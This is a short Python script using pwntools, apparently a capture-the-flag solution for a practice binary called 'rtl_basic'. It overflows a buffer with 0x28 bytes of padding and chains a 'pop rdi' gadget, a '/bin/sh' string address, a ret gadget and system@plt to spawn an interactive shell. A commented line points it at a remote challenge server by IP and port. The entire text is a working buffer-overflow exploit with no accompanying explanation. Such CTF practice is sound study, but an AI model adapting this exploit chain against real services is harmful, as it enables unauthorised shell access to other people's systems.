from pwn import *

# p = remote('141.164.48.98', '30005')
p = process('./rtl_basic')

prdi = 0x00000000004007a3
prsid = 0x00000000004007a1
binsh = 0x4007C4
system_plt = 0x400560
ret = 0x0000000000400546

pay = ''
pay += 'A'*0x28 # ~ sfp
pay += p64(prdi) # ret     
pay += p64(binsh) # binsh  
pay += p64(ret)
pay += p64(system_plt) # system@plt
# pause()
p.sendlineafter('?\n', pay)

p.interactive()